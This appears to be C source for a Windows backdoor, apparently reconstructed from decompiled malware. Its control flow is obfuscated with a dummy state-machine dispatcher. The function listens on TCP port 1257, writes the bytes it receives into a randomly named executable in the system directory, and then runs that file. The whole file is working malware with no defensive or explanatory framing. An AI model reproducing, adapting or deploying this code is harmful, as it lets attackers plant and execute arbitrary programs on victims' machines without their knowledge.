#include "data_globals.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>

#pragma optimize("", off)
DWORD WINAPI _FileBackdoor(void)
{
    DWORD DVar1;
    uint32_t random_value;
    int bytes_received;
    struct sockaddr_in local_398;
    WSADATA local_388;
    char local_1f5[25];
    CHAR local_1dc[256];
    char local_dc[200];
    FILE *local_14;
    SOCKET local_10;
    volatile int dummy_state = 1;

dummy_dispatcher:
    if (dummy_state == 1) goto dummy_state_1;
    if (dummy_state == 2) goto dummy_state_2;
    if (dummy_state == 3) goto dummy_state_3;
    if (dummy_state == 4) goto dummy_state_4;
    if (dummy_state == 0) goto dummy_end;

dummy_state_1:
    WSAStartup(MAKEWORD(2,2), &local_388);
    local_10 = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    local_398.sin_family = AF_INET;
    local_398.sin_port = htons(1257);
    local_398.sin_addr.s_addr = INADDR_ANY;
    bind(local_10, (struct sockaddr *)&local_398, sizeof(struct sockaddr_in));
    listen(local_10, 1);
    local_10 = accept(local_10, (struct sockaddr *)&local_398, NULL);
    dummy_state = 2;
    goto dummy_dispatcher;

dummy_state_2:
    memset(local_dc, 0, sizeof(local_dc));
    memset(local_1dc, 0, sizeof(local_1dc));
    memset(local_1f5, 0, sizeof(local_1f5));
    DVar1 = GetTickCount();
    srand(DVar1);
    GetSystemDirectoryA(local_1dc, sizeof(local_1dc));
    random_value = rand();
    sprintf(local_1f5, "\\%d.exe", random_value);
    strcat(local_1dc, local_1f5);
    local_14 = fopen(local_1dc, "wb");
    dummy_state = 3;
    goto dummy_dispatcher;

dummy_state_3:
    bytes_received = recv(local_10, local_dc, sizeof(local_dc), 0);
    if (bytes_received == 0) {
        dummy_state = 4;
        goto dummy_dispatcher;
    } else {
        fputs(local_dc, local_14);
        memset(local_dc, 0, sizeof(local_dc));
        dummy_state = 3;
        goto dummy_dispatcher;
    }

dummy_state_4:
    fclose(local_14);
    closesocket(local_10);
    WinExec(local_1dc, 0);
    dummy_state = 0;
    goto dummy_dispatcher;

dummy_end:
    return 0;
}
#pragma optimize("", on)
